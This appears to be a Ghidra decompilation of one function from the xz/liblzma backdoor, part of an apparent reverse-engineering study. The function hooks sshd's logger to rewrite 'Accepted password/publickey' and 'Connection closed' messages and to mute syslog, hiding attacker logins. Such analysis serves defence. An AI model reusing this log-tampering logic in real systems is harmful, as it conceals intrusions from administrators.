// /home/kali/xzre-ghidra/xzregh/10A3A0_mm_log_handler_hook.c
// Function: mm_log_handler_hook @ 0x10A3A0
// Calling convention: __stdcall
// Prototype: void __stdcall mm_log_handler_hook(LogLevel level, int forced, char * msg, void * ctx)


/*
 * AutoDoc: Interposes on sshd's log handler, bailing out entirely when logging has been globally disabled or sshd already dropped
 * privileges back to the sandbox. In filtering mode it scans the formatted string for the `"Connection closed by ...
 * (preauth)"` pattern, rebuilds a safe replacement message from attacker-provided format strings, and emits it through
 * `sshd_log()` while optionally muting syslog via the saved libc pointers. Messages that mention accepted authentication
 * events trigger a second rewrite path so only the sanitised strings ever reach sshd's real logger.
 */

#include "xzre_types.h"

void mm_log_handler_hook(LogLevel level,int forced,char *msg,void *ctx)

{
  char *pcVar1;
  BOOL BVar2;
  sshd_log_ctx_t *log_ctx_00;
  long lVar3;
  EncodedStringId EVar4;
  ssize_t sVar5;
  long lVar6;
  long lVar7;
  ulong uVar8;
  char *pcVar9;
  undefined4 *puVar10;
  char *pcVar11;
  char *pcVar12;
  char *pcVar13;
  ulong uVar14;
  ulong uVar15;
  byte bVar16;
  char rewritten_msg [320];
  sshd_log_ctx_t *log_ctx;
  log_handler_fn sshlog_impl;
  u64 filtered_host_chunk0;
  u64 filtered_host_chunk1;
  uint filtered_host_words[60];
  u64 user_fragment_chunk0;
  u64 user_fragment_chunk1;
  uint user_fragment_words[60];
  u64 prefix_chunk0;
  u64 prefix_chunk1;
  uint prefix_word;
  char authenticating_label[14];
  uchar label_space;
  char user_label[4];
  uchar user_space;
  char percent_s_head0;
  char percent_s_head1;
  uchar percent_s_padding;
  char percent_s_tail0;
  char percent_s_tail1;
  ushort open_bracket_padding;
  char preauth_label[7];
  uchar closing_bracket_char;
  
  bVar16 = 0;
  log_ctx_00 = *(sshd_log_ctx_t **)(global_ctx + 0x30);
  lVar3 = *(long *)(global_ctx + 0x10);
  filtered_host_chunk0 = 0;
  filtered_host_chunk1 = 0;
  puVar10 = filtered_host_words;
  for (lVar7 = 0x3c; lVar7 != 0; lVar7 = lVar7 + -1) {
    *puVar10 = 0;
    puVar10 = puVar10 + 1;
  }
  user_fragment_chunk0 = 0;
  user_fragment_chunk1 = 0;
  puVar10 = user_fragment_words;
  for (lVar7 = 0x3c; lVar7 != 0; lVar7 = lVar7 + -1) {
    *puVar10 = 0;
    puVar10 = puVar10 + 1;
  }
  prefix_chunk0 = 0;
  prefix_chunk1 = 0;
  puVar10 = &prefix_word;
  for (lVar7 = 0x7c; lVar7 != 0; lVar7 = lVar7 + -1) {
    *puVar10 = 0;
    puVar10 = puVar10 + 1;
  }
  if (msg != (char *)0x0) {
    if (log_ctx_00->log_squelched == TRUE) {
      return;
    }
    if (*(int *)(global_ctx + 0x90) != 0) {
      return;
    }
    if ((log_ctx_00->saved_log_handler != (log_handler_fn)0x0) &&
       (log_ctx_00->saved_log_handler_ctx == (void *)0x0)) {
      return;
    }
    sVar5 = c_strlen(msg);
    pcVar1 = msg + sVar5;
    while( TRUE ) {
      if (pcVar1 <= msg) {
        return;
      }
      EVar4 = get_string_id(msg,pcVar1);
      if (EVar4 == STR_Connection_closed_by) break;
      if ((EVar4 == STR_Accepted_password_for) || (EVar4 == STR_Accepted_publickey_for)) {
        pcVar13 = msg + 0x17;
        if (EVar4 == STR_Accepted_password_for) {
          pcVar13 = msg + 0x16;
        }
        uVar14 = 0;
        pcVar12 = (char *)0x0;
        uVar15 = 0;
        goto LAB_0010a504;
      }
      msg = msg + 1;
    }
    prefix_chunk0 = CONCAT62((prefix_chunk0 >> 16),*(undefined2 *)log_ctx_00->fmt_percent_s);
    log_ctx_00->log_squelched = TRUE;
    if (((log_ctx_00->syslog_mask_applied != FALSE) && (lVar3 != 0)) &&
       (*(code **)(lVar3 + 0x58) != (code *)0x0)) {
      (**(code **)(lVar3 + 0x58))(0xff);
    }
    sshd_log(log_ctx_00,level,(char *)&prefix_chunk0,msg);
    BVar2 = log_ctx_00->syslog_mask_applied;
    goto joined_r0x0010a4c2;
  }
  goto LAB_0010a6da;
LAB_0010a504:
  do {
    EVar4 = get_string_id(msg,pcVar1);
    if (EVar4 == STR_ssh2) {
      if (pcVar12 != (char *)0x0) {
        uVar14 = (long)msg - (long)pcVar12;
        uVar8 = uVar14;
        pcVar9 = pcVar12;
        pcVar11 = (char *)&filtered_host_chunk0;
        if (0xff < uVar14) goto LAB_0010a6da;
        for (; uVar8 != 0; uVar8 = uVar8 - 1) {
          *pcVar11 = *pcVar9;
          pcVar9 = pcVar9 + (ulong)bVar16 * -2 + 1;
          pcVar11 = pcVar11 + (ulong)bVar16 * -2 + 1;
        }
      }
    }
    else if (EVar4 == STR_from) {
      uVar15 = (long)msg - (long)pcVar13;
      if (0xff < uVar15) goto LAB_0010a6da;
      pcVar12 = msg + 6;
      pcVar9 = pcVar13;
      pcVar11 = (char *)&user_fragment_chunk0;
      for (uVar8 = uVar15; uVar8 != 0; uVar8 = uVar8 - 1) {
        *pcVar11 = *pcVar9;
        pcVar9 = pcVar9 + (ulong)bVar16 * -2 + 1;
        pcVar11 = pcVar11 + (ulong)bVar16 * -2 + 1;
      }
    }
    msg = msg + 1;
  } while (msg < pcVar1);
  if ((uVar15 != 0) && (uVar14 != 0)) {
    pcVar1 = log_ctx_00->str_connection_closed_by;
    lVar7 = 0;
    do {
      lVar6 = lVar7 + 1;
      *(char *)((long)&prefix_chunk0 + lVar7) = pcVar1[lVar7];
      lVar7 = lVar6;
    } while (lVar6 != 0x15);
    pcVar1 = log_ctx_00->str_authenticating;
    lVar7 = 0;
    do {
      authenticating_label[lVar7] = pcVar1[lVar7];
      lVar7 = lVar7 + 1;
    } while (lVar7 != 0xe);
    label_space = 0x20;
    pcVar1 = log_ctx_00->str_user;
    lVar7 = 0;
    do {
      user_label[lVar7] = pcVar1[lVar7];
      lVar7 = lVar7 + 1;
    } while (lVar7 != 4);
    user_space = 0x20;
    percent_s_head0 = *log_ctx_00->fmt_percent_s;
    percent_s_head1 = log_ctx_00->fmt_percent_s[1];
    percent_s_padding = 0x20;
    percent_s_tail0 = *log_ctx_00->fmt_percent_s;
    percent_s_tail1 = log_ctx_00->fmt_percent_s[1];
    open_bracket_padding = 0x5b20;
    pcVar1 = log_ctx_00->str_preauth;
    lVar7 = 0;
    do {
      preauth_label[lVar7] = pcVar1[lVar7];
      lVar7 = lVar7 + 1;
    } while (lVar7 != 7);
    closing_bracket_char = 0x5d;
    log_ctx_00->log_squelched = TRUE;
    if (((log_ctx_00->syslog_mask_applied != FALSE) && (lVar3 != 0)) &&
       (*(code **)(lVar3 + 0x58) != (code *)0x0)) {
      (**(code **)(lVar3 + 0x58))(0xff);
    }
    sshd_log(log_ctx_00,SYSLOG_LEVEL_INFO,(char *)&prefix_chunk0,&user_fragment_chunk0,&filtered_host_chunk0);
    BVar2 = log_ctx_00->syslog_mask_applied;
joined_r0x0010a4c2:
    if (BVar2 == FALSE) {
      return;
    }
    if (lVar3 == 0) {
      return;
    }
    if (*(code **)(lVar3 + 0x58) == (code *)0x0) {
      return;
    }
    (**(code **)(lVar3 + 0x58))(0x80000000);
    return;
  }
LAB_0010a6da:
  log_ctx_00->log_squelched = TRUE;
  return;
}

